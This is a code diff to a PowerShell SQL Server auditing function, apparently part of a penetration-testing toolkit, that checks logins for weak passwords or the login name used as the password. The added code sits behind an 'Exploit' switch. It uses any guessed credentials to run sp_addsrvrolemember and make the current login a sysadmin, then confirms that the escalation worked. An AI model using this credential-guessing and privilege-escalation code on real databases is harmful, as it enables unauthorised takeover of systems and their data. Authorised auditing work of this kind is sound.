@@ -8233,6 +8233,7 @@ Function Invoke-SQLAuditWeakLoginPw{
         $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         $CurrentLogin = $ServerInfo.CurrentLogin
         $ComputerName = $ServerInfo.ComputerName
+        $CurrentUSerSysadmin = $ServerInfo.IsSysadmin        
 
         # --------------------------------------------     
         # Set function meta data for report output
@@ -8356,7 +8357,7 @@ Function Invoke-SQLAuditWeakLoginPw{
                 $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetPassword -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
                 if($TestPass){                    
 
-                    # Check if sysadmin
+                    # Check if guess credential is a sysadmin
                     $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetPassword -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
                     if($IsSysadmin -eq "Yes"){
                         $SysadminStatus = "Sysadmin"
@@ -8366,12 +8367,31 @@ Function Invoke-SQLAuditWeakLoginPw{
 
                     Write-Verbose "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetPassword" 
 
-                    # Add current user as sysadmin if login was successful
-                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
+                    if($Exploit){
+                                                
+                        Write-Verbose "$Instance - Trying to make you a sysadmin..."
+                        
+                        # Check if the current login is a sysadmin
+                        $IsSysadmin1 =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+                        if($IsSysadmin1 -eq "Yes"){
+                             Write-Verbose "$Instance - You're already a sysadmin. Nothing to do." 
+                        }else{
+                            Write-Verbose "$Instance - You're not currently a sysadmin. Let's change that..." 
+                            
+                             # Add current user as sysadmin if login was successful
+                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetPassword -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
 
-
-                    # Add current user as sysadmin if login was successful
-                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
+                            # Check if the current login is a sysadmin again
+                            $IsSysadmin2 =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+                            if($IsSysadmin2 -eq "Yes"){
+                                $Exploited = "Yes"
+                                 Write-Verbose "$Instance - SUCCESS! You're a sysadmin now." 
+                            }else{
+                                $Exploited = "No"
+                                Write-Verbose "$Instance - Fail. We coudn't add you as a sysadmin."                             
+                            }                                                
+                        }                                                                         
+                    }
 
                     # Add record                    
                     $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetPassword."
@@ -8394,9 +8414,9 @@ Function Invoke-SQLAuditWeakLoginPw{
                 $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetLogin -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
                 if($TestPass){
 
-                    # Check if sysadmin
-                    $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetLogin -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
-                    if($IsSysadmin -eq "Yes"){
+                    # Check if user/name combo has sysadmin
+                    $IsSysadmin3 =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetLogin -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+                    if($IsSysadmin3 -eq "Yes"){
                         $SysadminStatus = "Sysadmin"
                     }else{
                         $SysadminStatus = "Not Sysadmin"
@@ -8404,8 +8424,29 @@ Function Invoke-SQLAuditWeakLoginPw{
 
                     Write-Verbose "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetLogin"
 
-                    # Add current user as sysadmin if login was successful
-                    Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose                     
+                    if(($Exploit) -and $IsSysadmin3 -eq "Yes"){                                                                        
+                                                
+                        # Check if the current login is a sysadmin
+                        $IsSysadmin4 =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+                        if($IsSysadmin4 -eq "Yes"){
+                             Write-Verbose "$Instance - You're already a sysadmin. Nothing to do." 
+                        }else{
+                            Write-Verbose "$Instance - You're not currently a sysadmin. Let's change that..." 
+                            
+                             # Add current user as sysadmin if login was successful
+                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetLogin -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose
+
+                            # Check if the current login is a sysadmin again
+                            $IsSysadmin5 =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
+                            if($IsSysadmin5 -eq "Yes"){
+                                $Exploited = "Yes"
+                                 Write-Verbose "$Instance - SUCCESS! You're a sysadmin now." 
+                            }else{
+                                $Exploited = "No"
+                                Write-Verbose "$Instance - Fail. We coudn't add you as a sysadmin."                             
+                            }                                                                        
+                        }                                                                        
+                    }
 
                     # Add record                    
                     $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetLogin."
